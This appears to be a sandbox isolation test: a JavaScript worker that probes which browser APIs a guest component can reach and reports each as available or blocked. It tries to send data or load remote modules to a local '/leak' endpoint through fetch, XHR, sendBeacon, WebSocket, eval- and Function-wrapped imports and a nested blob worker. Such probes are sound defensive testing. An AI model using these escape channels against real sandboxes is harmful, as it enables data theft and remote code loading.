const send = (kind, payload) => self.postMessage({ v: 1, kind, payload });

async function attempt(label, callback) {
  try {
    await callback();
    return `${label}:available`;
  } catch {
    return `${label}:blocked`;
  }
}

async function probe() {
  const observations = [
    `document:${typeof document}`,
    `window:${typeof window}`,
    `parent:${typeof parent}`,
    `localStorage:${typeof localStorage}`,
    `fetch:${typeof fetch}`,
    `WebSocket:${typeof WebSocket}`,
    `XMLHttpRequest:${typeof XMLHttpRequest}`,
    `EventSource:${typeof EventSource}`,
    `importScripts:${typeof importScripts}`,
    `BroadcastChannel:${typeof BroadcastChannel}`,
    `Worker:${typeof Worker}`,
    `SharedWorker:${typeof SharedWorker}`,
    `WebSocketStream:${typeof WebSocketStream}`,
    `indexedDB:${typeof indexedDB}`,
    `caches:${typeof caches}`,
    `RTCPeerConnection:${typeof RTCPeerConnection}`,
    `WebTransport:${typeof WebTransport}`,
    `serviceWorker:${typeof navigator.serviceWorker}`,
    `sendBeacon:${typeof navigator.sendBeacon}`,
  ];

  observations.push(await attempt('fetch', () => fetch('http://127.0.0.1:4173/leak?via=fetch')));
  observations.push(await attempt('xhr', () => {
    const request = new XMLHttpRequest();
    request.open('GET', 'http://127.0.0.1:4173/leak?via=xhr');
    request.send();
  }));
  observations.push(await attempt('eventSource', () => new EventSource('http://127.0.0.1:4173/leak?via=event-source')));
  observations.push(await attempt('sendBeacon', () => navigator.sendBeacon('http://127.0.0.1:4173/leak?via=beacon', 'secret')));
  observations.push(await attempt('broadcastChannel', () => new BroadcastChannel('cross-home-probe')));
  observations.push(await attempt('importScripts', () => importScripts('http://127.0.0.1:4173/leak-module.mjs?via=import-scripts')));
  observations.push(await attempt('evalImport', () => eval("import('http://127.0.0.1:4173/leak-module.mjs?via=eval-import')")));
  observations.push(await attempt('functionImport', () => Function("return import('http://127.0.0.1:4173/leak-module.mjs?via=function-import')")()));
  observations.push(await attempt('websocket', () => new Promise((resolve, reject) => {
    const socket = new WebSocket('ws://127.0.0.1:4173/leak?via=websocket');
    socket.onopen = () => { socket.close(); resolve(); };
    socket.onerror = reject;
  })));
  observations.push(await attempt('indexedDB', () => new Promise((resolve, reject) => {
    if (typeof indexedDB === 'undefined') return reject(new Error('missing'));
    const request = indexedDB.open('cross-home-probe');
    request.onsuccess = () => { request.result.close(); resolve(); };
    request.onerror = reject;
  })));
  observations.push(await attempt('cacheStorage', async () => {
    if (typeof caches === 'undefined') throw new Error('missing');
    await caches.open('cross-home-probe');
  }));

  if (typeof Worker !== 'undefined') {
    observations.push(await attempt('subworkerFetch', () => new Promise((resolve, reject) => {
      const source = `fetch('http://127.0.0.1:4173/leak?via=subworker').then(() => postMessage('open'), () => postMessage('blocked'))`;
      const url = URL.createObjectURL(new Blob([source], { type: 'text/javascript' }));
      const nested = new Worker(url);
      nested.onmessage = (event) => {
        nested.terminate();
        URL.revokeObjectURL(url);
        if (event.data === 'blocked') reject(new Error('blocked'));
        else resolve();
      };
      nested.onerror = reject;
    })));
  }

  send('ui.render', {
    revision: 2,
    tree: {
      id: 'home',
      type: 'screen',
      props: { title: 'Boundary probe' },
      children: [{
        id: 'observations',
        type: 'text',
        props: { text: observations.join('|') },
      }],
    },
  });
}

self.onmessage = (event) => {
  if (event.data.kind === 'state.snapshot') {
    send('ui.render', {
      revision: 1,
      tree: {
        id: 'home',
        type: 'screen',
        props: { title: 'Boundary probe' },
        children: [{
          id: 'observations',
          type: 'text',
          props: { text: 'Probe running' },
        }],
      },
    });
    void probe();
  }
};

send('guest.ready', { abi: 'miakapp.component/1' });
